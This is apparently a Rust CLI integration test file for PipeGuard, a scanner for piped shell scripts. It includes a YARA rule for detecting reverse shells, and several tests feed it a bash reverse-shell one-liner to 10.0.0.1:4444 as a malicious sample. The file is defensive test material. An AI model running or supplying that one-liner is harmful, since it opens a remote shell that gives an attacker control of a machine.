mod common;

use predicates::prelude::*;
use std::fs;
use tempfile::TempDir;

fn create_test_rule_file(dir: &TempDir) -> std::path::PathBuf {
    let rule = r#"
        rule test_reverse_shell {
            meta:
                severity = 10
                description = "Reverse shell detected"
            strings:
                $bash_i = "bash -i"
                $dev_tcp = "/dev/tcp/"
            condition:
                $bash_i and $dev_tcp
        }
    "#;
    let path = dir.path().join("test.yar");
    fs::write(&path, rule).unwrap();
    path
}

#[test]
fn cli_shows_help() {
    common::pipeguard_cmd()
        .arg("--help")
        .assert()
        .success()
        .stdout(predicate::str::contains("PipeGuard"))
        .stdout(predicate::str::contains("curl|bash"));
}

#[test]
fn cli_shows_version() {
    common::pipeguard_cmd()
        .arg("--version")
        .assert()
        .success()
        .stdout(predicate::str::contains(env!("CARGO_PKG_VERSION")));
}

#[test]
fn cli_scan_detects_malicious_stdin() {
    let temp_dir = TempDir::new().unwrap();
    let rule_path = create_test_rule_file(&temp_dir);

    common::pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(&rule_path)
        .write_stdin("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        .assert()
        .failure() // Non-zero exit for threats
        .stdout(predicate::str::contains("High"))
        .stdout(predicate::str::contains("reverse_shell"));
}

#[test]
fn cli_scan_allows_clean_stdin() {
    let temp_dir = TempDir::new().unwrap();
    let rule_path = create_test_rule_file(&temp_dir);

    common::pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(&rule_path)
        .write_stdin("echo 'Hello, World!'")
        .assert()
        .success()
        .stdout(predicate::str::contains("No threats"));
}

#[test]
fn cli_scan_reads_from_file() {
    let temp_dir = TempDir::new().unwrap();
    let rule_path = create_test_rule_file(&temp_dir);

    let script_path = temp_dir.path().join("script.sh");
    fs::write(&script_path, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").unwrap();

    common::pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(&rule_path)
        .arg("--file")
        .arg(&script_path)
        .assert()
        .failure()
        .stdout(predicate::str::contains("High"));
}

#[test]
fn cli_scan_json_output() {
    let temp_dir = TempDir::new().unwrap();
    let rule_path = create_test_rule_file(&temp_dir);

    common::pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(&rule_path)
        .arg("--format")
        .arg("json")
        .write_stdin("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        .assert()
        .failure()
        .stdout(predicate::str::contains("\"threat_level\""))
        .stdout(predicate::str::contains("\"matches\""));
}

#[test]
fn cli_install_shell_integration() {
    common::pipeguard_cmd()
        .arg("install")
        .arg("--dry-run")
        .assert()
        .success()
        .stdout(predicate::str::contains("zsh"))
        .stdout(predicate::str::contains("bash"));
}

#[test]
fn cli_config_init_creates_default() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("config.toml");

    common::pipeguard_cmd()
        .arg("config")
        .arg("init")
        .arg("--path")
        .arg(&config_path)
        .assert()
        .success();

    assert!(config_path.exists());
    let content = fs::read_to_string(&config_path).unwrap();
    assert!(content.contains("enable_yara"));
}

#[test]
fn cli_rules_list_shows_builtin() {
    common::pipeguard_cmd()
        .arg("rules")
        .arg("list")
        .assert()
        .success()
        .stdout(predicate::str::contains("reverse_shell").or(predicate::str::contains("No rules")));
}

#[test]
fn cli_log_level_flag_accepted() {
    common::pipeguard_cmd()
        .arg("--log-level")
        .arg("debug")
        .arg("rules")
        .arg("list")
        .assert()
        .success();
}

#[test]
fn cli_log_level_invalid_rejected() {
    common::pipeguard_cmd()
        .arg("--log-level")
        .arg("verbose")
        .arg("rules")
        .arg("list")
        .assert()
        .failure()
        .stderr(predicate::str::contains("possible values"));
}

#[test]
fn cli_debug_logging_shows_on_stderr_not_stdout() {
    let temp_dir = TempDir::new().unwrap();
    let rule_path = create_test_rule_file(&temp_dir);

    let output = common::pipeguard_cmd()
        .arg("--log-level")
        .arg("debug")
        .arg("scan")
        .arg("--rules")
        .arg(&rule_path)
        .write_stdin("echo 'Hello, World!'")
        .output()
        .unwrap();

    assert!(output.status.success());

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("No threats"),
        "stdout should contain scan results, got: {}",
        stdout
    );
    assert!(
        !stdout.contains("DEBUG") && !stdout.contains("WARN"),
        "stdout should not contain tracing output, got: {}",
        stdout
    );

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        !stderr.is_empty(),
        "stderr should contain debug logging output, but was empty"
    );
}

#[test]
fn default_log_level_produces_no_stderr_noise() {
    let temp_dir = TempDir::new().unwrap();
    let rule_path = create_test_rule_file(&temp_dir);

    let output = common::pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(&rule_path)
        .write_stdin("echo 'Hello, World!'")
        .output()
        .unwrap();

    assert!(output.status.success());

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.is_empty(),
        "At default warn level, stderr should be empty for a clean scan, but got: {}",
        stderr
    );
}
